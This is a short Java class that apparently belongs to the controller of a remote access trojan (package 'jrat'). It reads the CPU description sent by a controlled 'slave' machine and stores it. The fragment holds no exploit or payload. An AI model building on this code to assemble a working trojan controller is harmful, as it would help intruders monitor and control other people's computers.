package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;

public class Packet19InitCPU extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String cpu = slave.readLine();
		slave.setCPU(cpu);
	}

}
